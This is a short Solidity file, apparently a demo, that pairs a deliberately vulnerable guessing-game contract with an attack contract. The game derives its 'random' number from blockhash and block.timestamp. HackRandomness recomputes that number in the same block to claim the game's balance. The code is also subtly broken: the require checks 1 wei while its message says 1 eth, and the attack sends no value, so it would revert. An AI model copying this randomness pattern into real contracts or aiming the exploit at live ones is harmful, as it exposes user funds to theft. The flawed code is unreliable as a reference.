// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

contract GuessNumber{
    function guess(uint num) public payable{
        require(msg.value ==1, "send 1 eth");
        uint _num = uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));

        if(num == _num){
            (bool send, ) = msg.sender.call{value: address(this).balance}("");
            require(send, "Balance not sent.");
        }
    }

    function showBal() external view returns(uint bal){
        bal = address(this).balance;
    }
}

contract HackRandomness{
    receive() external payable{}
    
    function attack(GuessNumber guessNumber) external payable {
        uint _num = uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
        guessNumber.guess(_num);
    }

    function showBal() external view returns(uint bal){
        bal = address(this).balance;
    }
}

